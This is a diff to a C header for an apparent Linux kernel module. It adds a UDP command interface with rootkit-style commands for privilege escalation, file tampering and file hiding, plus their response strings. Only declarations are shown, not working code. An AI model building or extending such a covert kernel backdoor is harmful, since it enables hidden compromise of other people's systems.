@@ -12,6 +12,18 @@
 #include <linux/delay.h>
 #include <linux/timer.h>
 
+#define MAX_RESPONSE 128
+
+/* commands */
+#define DO_PRIV_ESC "privesc"
+#define UNDO_PRIV_ESC "undo-privesc"
+#define DO_TAMPER_FILE "tamper-file"
+#define DO_HIDE_FILE "hide-file"
+
+/* responses */
+#define RESP_PRIV_DO "[LRZS] % PRIVESC DONE\n"
+#define RESP_PRIV_UNDO "[LRZS] % PRIVESC UNDONE\n"
+
 /* struct for udp kernel thread */
 struct kthread_t {
   struct task_struct *curr;
@@ -23,6 +35,7 @@ struct kthread_t {
 int server_start(void);
 void server_stop(void);
 int server_rcv(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
-int server_do(const char *command, struct sockaddr_in *addr);
+int server_snd(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
+void server_do(const char *command, struct sockaddr_in *addr);
 
 #endif
